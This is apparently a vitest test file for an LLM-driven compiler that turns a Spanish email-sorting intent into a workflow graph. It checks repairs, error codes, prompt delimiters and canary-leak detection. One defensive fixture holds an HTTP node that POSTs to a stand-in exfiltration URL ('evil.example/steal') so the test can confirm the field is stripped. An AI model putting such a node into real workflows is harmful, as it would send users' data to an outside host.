import { FakeProvider, LlmError, newGuardTokens, type FakeStep } from '@cognitive-dag/llm';
import { describe, expect, it } from 'vitest';
import {
  CompilerError,
  compile,
  type CompileOptions,
  type CompileOutcome,
  type IntermediateDag,
} from '../src/index.js';
import { classifyAndBranch, F5_TYPES, withCycle } from './fixtures.js';

const INTENT = 'Clasifica cada correo de Ana como spam o no, archiva el spam y responde el resto.';

const answer = (dag: unknown): FakeStep => ({ text: JSON.stringify(dag) });

function options(provider: FakeProvider, extra: Partial<CompileOptions> = {}): CompileOptions {
  return {
    provider,
    model: 'fake-model',
    intent: INTENT,
    allowedTypes: F5_TYPES,
    tokens: { nonce: 'n'.repeat(32), canary: 'canary-test' },
    ...extra,
  };
}

function succeeded(outcome: CompileOutcome) {
  if (outcome.status !== 'succeeded') throw new Error(`expected success, got ${outcome.errorCode}`);
  return outcome;
}

function failed(outcome: CompileOutcome) {
  if (outcome.status !== 'failed') throw new Error('expected a failure');
  return outcome;
}

describe('compile: success (US1)', () => {
  it('returns a valid, laid-out definition with the usage of one call', async () => {
    const provider = new FakeProvider([answer(classifyAndBranch())]);
    const outcome = succeeded(await compile(options(provider)));
    expect(outcome.title).toBe('Clasificar correos');
    expect(outcome.validation).toEqual({ valid: true, errors: [] });
    expect(outcome.definition.nodes.map((node) => node.position.x)).toEqual([
      0, 280, 560, 840, 840,
    ]);
    expect(outcome.calls).toBe(1);
    expect(outcome.repairs).toBe(0);
    expect(outcome.nodeCount).toBe(5);
    expect(outcome.usage.inputTokens).toBeGreaterThan(0);
    expect(outcome.omittedSensitiveFields).toEqual([]);
  });

  it('applies the defaults of the node configuration', async () => {
    const dag = classifyAndBranch();
    const provider = new FakeProvider([answer(dag)]);
    const outcome = succeeded(await compile(options(provider)));
    const classify = outcome.definition.nodes[1]?.config as { redactPii?: boolean };
    expect(classify.redactPii).toBe(false);
  });

  it('sends the intent only inside the delimiter and the intermediate schema', async () => {
    const provider = new FakeProvider([answer(classifyAndBranch())]);
    await compile(options(provider));
    const request = provider.calls[0];
    expect(request?.system).not.toContain(INTENT);
    expect(request?.user).toContain(INTENT);
    expect(request?.responseJsonSchema).toMatchObject({ required: ['title', 'nodes', 'edges'] });
  });
});

describe('compile: repairs (US3, research R7)', () => {
  it('repairs a cycle once and then succeeds', async () => {
    const provider = new FakeProvider([answer(withCycle()), answer(classifyAndBranch())]);
    const outcome = succeeded(await compile(options(provider)));
    expect(outcome.repairs).toBe(1);
    expect(outcome.calls).toBe(2);
    expect(provider.calls[1]?.repair?.errors.join('\n')).toMatch(/CYCLE_DETECTED/);
  });

  it('repairs a type outside the catalog', async () => {
    const dag = classifyAndBranch();
    const foreign = {
      ...dag,
      nodes: [...dag.nodes, { id: 'mail', type: 'email.send', label: 'Enviar', config: {} }],
    };
    const provider = new FakeProvider([answer(foreign), answer(dag)]);
    const outcome = succeeded(await compile(options(provider)));
    expect(outcome.repairs).toBe(1);
    expect(provider.calls[1]?.repair?.errors.join('\n')).toMatch(/nodes\.5\.type/);
  });

  it('never puts the intent, labels or ids from it in the repair turn', async () => {
    const dag = withCycle();
    const leaky = {
      ...dag,
      nodes: dag.nodes.map((node) =>
        node.id === 'reply' ? { ...node, label: 'Responder a Ana' } : node,
      ),
    };
    const provider = new FakeProvider([answer(leaky), answer(classifyAndBranch())]);
    await compile(options(provider));
    const errors = provider.calls[1]?.repair?.errors.join('\n') ?? '';
    expect(errors).not.toContain('Ana');
    expect(errors).not.toContain('reply');
    expect(errors).not.toContain('Responder');
    expect(errors).toMatch(/nodes\[\d\]/);
  });

  it('fails COMPILER_INVALID_DAG with a fallback after three answers that pass the schema', async () => {
    const provider = new FakeProvider([
      answer(withCycle()),
      answer(withCycle()),
      answer(withCycle()),
    ]);
    const outcome = failed(await compile(options(provider)));
    expect(outcome.errorCode).toBe('COMPILER_INVALID_DAG');
    expect(outcome.errorClass).toBe('invalid_output');
    expect(outcome.calls).toBe(3);
    expect(outcome.repairs).toBe(2);
    expect(outcome.fallback?.validation.valid).toBe(false);
    expect(outcome.fallback?.validation.errors.map((e) => e.code)).toContain('CYCLE_DETECTED');
    expect(outcome.fallback?.definition.nodes).toHaveLength(5);
  });

  it('fails without a fallback when the last answer does not pass the schema', async () => {
    const provider = new FakeProvider([
      answer(withCycle()),
      answer(withCycle()),
      { text: '{"nodes":[]}' },
    ]);
    const outcome = failed(await compile(options(provider)));
    expect(outcome.errorCode).toBe('COMPILER_INVALID_DAG');
    expect(outcome.fallback).toBeUndefined();
  });

  it('fails LLM_CONTENT_BLOCKED without repairing and without a fallback', async () => {
    const provider = new FakeProvider([{ text: '', blocked: true }]);
    const outcome = failed(await compile(options(provider)));
    expect(outcome.errorCode).toBe('LLM_CONTENT_BLOCKED');
    expect(outcome.calls).toBe(1);
    expect(outcome.fallback).toBeUndefined();
  });

  it('treats the canary in the output as an invalid output', async () => {
    const dag = classifyAndBranch();
    const leak = { ...dag, title: 'canary-test' };
    const provider = new FakeProvider([answer(leak)]);
    const outcome = failed(await compile(options(provider)));
    expect(outcome.errorCode).toBe('LLM_CANARY_LEAK');
  });
});

describe('compile: what is not its decision', () => {
  it('rethrows transient provider errors so the activity retries', async () => {
    const provider = new FakeProvider([
      { error: Object.assign(new Error('boom'), { status: 503 }) },
    ]);
    await expect(compile(options(provider))).rejects.toMatchObject({
      code: 'LLM_PROVIDER_UNAVAILABLE',
    });
  });

  it('calls beforeCall before every call and stops when it throws', async () => {
    const provider = new FakeProvider([answer(withCycle()), answer(classifyAndBranch())]);
    const calls: number[] = [];
    const budget = new LlmError('LLM_DAILY_BUDGET_EXHAUSTED', 'agotado');
    await expect(
      compile(
        options(provider, {
          beforeCall: (call) => {
            calls.push(call);
            if (call === 1) throw budget;
          },
        }),
      ),
    ).rejects.toBe(budget);
    expect(calls).toEqual([0, 1]);
    expect(provider.calls).toHaveLength(1);
  });

  it('refuses an empty or too long intent without calling', async () => {
    const provider = new FakeProvider([]);
    await expect(compile(options(provider, { intent: '   ' }))).rejects.toMatchObject({
      code: 'COMPILER_EMPTY_INTENT',
    });
    await expect(compile(options(provider, { intent: 'a'.repeat(2001) }))).rejects.toBeInstanceOf(
      CompilerError,
    );
    expect(provider.calls).toHaveLength(0);
  });

  it('removes sensitive fields after validating and reports them as missing (US4)', async () => {
    const dag: IntermediateDag = {
      title: 'Llamar',
      nodes: [
        { id: 'start', type: 'trigger.manual', label: 'Inicio', config: {} },
        {
          id: 'call',
          type: 'http.request',
          label: 'Llamar',
          config: { method: 'POST', url: 'https://evil.example/steal', body: 'x' },
        },
      ],
      edges: [{ from: 'start', fromHandle: 'out', to: 'call' }],
    };
    const provider = new FakeProvider([answer(dag)]);
    const outcome = succeeded(
      await compile(options(provider, { allowedTypes: ['trigger.manual', 'http.request'] })),
    );
    expect(JSON.stringify(outcome.definition)).not.toContain('evil.example');
    expect(outcome.omittedSensitiveFields).toEqual([
      { nodeId: 'call', field: 'url' },
      { nodeId: 'call', field: 'headers' },
      { nodeId: 'call', field: 'body' },
    ]);
    expect(outcome.validation.valid).toBe(false);
    expect(outcome.repairs).toBe(0);
  });

  it('uses fresh tokens when none are given', async () => {
    const provider = new FakeProvider([answer(classifyAndBranch())]);
    const { tokens: _tokens, ...rest } = options(provider);
    succeeded(await compile(rest));
    expect(provider.calls[0]?.user).toMatch(/^<data-[0-9a-f]{32}>/);
    expect(newGuardTokens().nonce).toHaveLength(32);
  });
});
